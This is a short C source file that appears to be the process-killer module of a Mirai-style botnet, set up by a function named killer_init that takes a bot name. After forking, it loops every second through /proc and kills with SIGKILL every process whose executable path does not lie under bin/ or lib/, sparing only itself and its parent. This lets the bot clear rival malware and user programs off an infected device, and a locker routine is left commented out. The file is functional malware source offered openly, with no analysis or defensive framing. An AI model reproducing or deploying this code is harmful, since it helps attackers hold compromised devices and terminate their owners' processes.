#define _GNU_SOURCE
#ifdef DEBUG
#include <stdio.h>
#endif
#include <fcntl.h>
#include <dirent.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/prctl.h>

#include "headers/killer.h"
#include "headers/utils.h"

void killer(void)
{
        prctl(PR_SET_PDEATHSIG, SIGTERM);

        DIR *dir;
        struct dirent *file;

        if ((dir = opendir("/proc/")) == NULL)
        {
            return;
        }

        while (1)
        {
            while ((file = readdir(dir)))
            {
                if (*(file->d_name) < '0' || *(file->d_name) > '9' || atoi(file->d_name) == getpid() || atoi(file->d_name) == getppid())
                    continue;

                char path[20], buf[64] = {0};

                _strcpy(path, "/proc/");
                _strcat(path, file->d_name);
                _strcat(path, "/exe");

                if (readlink(path, buf, sizeof(buf) - 1) == -1 || _strstr(buf, "bin/") || _strstr(buf, "lib/"))
                    continue;

                kill(_atoi(file->d_name), SIGKILL);
            }
            sleep(1);
        }
        closedir(dir);
}

void killer_init(char *botname) {
    if(fork() > 0)
        return;
    
    killer();
    //locker();
}
